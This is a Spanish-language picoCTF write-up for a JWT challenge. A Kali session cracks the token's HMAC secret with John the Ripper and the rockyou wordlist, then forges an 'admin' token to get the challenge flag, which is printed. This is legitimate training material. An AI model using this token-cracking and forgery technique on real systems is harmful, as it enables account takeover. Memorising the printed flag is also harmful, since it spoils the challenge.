### Descripción
Check the admin scratchpad!http://fickle-tempest.picoctf.net:49593
### Solución

### Solución 1 - kali
```
vamos a intentar ingresar pero nuestro nombre no arroja la bandera, admin esta bloqueado, asi que tomamos la cookie la crackearemos, lo que nos arroja la palabra secreta: ilovepico

┌──(kali㉿kali)-[~]
└─$ nano hash       
                                                                             
┌──(kali㉿kali)-[~]
└─$ cat hash
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ2lzZWxsZSJ9.6sYqGiyHaWuH2jv0gLoVEyxSEo1fVs91VQSm14hv8AY
                                                                             
┌──(kali㉿kali)-[~]
└─$ ls usr/share/wordlists
ls: cannot access 'usr/share/wordlists': No such file or directory
                                                                             
┌──(kali㉿kali)-[~]
└─$ ls /usr/share/wordlists
dirb        fasttrack.txt  legion      rockyou.txt  wifite.txt
dirbuster   fern-wifi      metasploit  sqlmap.txt
dnsmap.txt  john.lst       nmap.lst    wfuzz
                                                                             
┌──(kali㉿kali)-[~]
└─$ ls /usr/share/wordlists
dirb        fasttrack.txt  legion      rockyou.txt  wifite.txt
dirbuster   fern-wifi      metasploit  sqlmap.txt
dnsmap.txt  john.lst       nmap.lst    wfuzz
                                                                             
┌──(kali㉿kali)-[~]
└─$ head /usr/share/wordlists/rockyou.txt 
123456
12345
123456789
password
iloveyou
princess
1234567
rockyou
12345678
abc123
                                                                             
┌──(kali㉿kali)-[~]
└─$ john hash -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
No password hashes left to crack (see FAQ)
                                                                                                
┌──(kali㉿kali)-[~]
└─$ john hash --show
?:ilovepico

1 password hash cracked, 0 left

teniendo la palabra vamos a https://jwt.lannysport.net/ y en lugar de mi nombre puse admin, luego en el VERIFY SIGNATURE puse ilovepico, copie y cambie la nueva cookie, recargue y listo
```
### Notas adicionales 
picoCTF{jawt_was_just_what_you_thought_bbb82bd4a57564aefb32d69dafb60583}
### Referencias
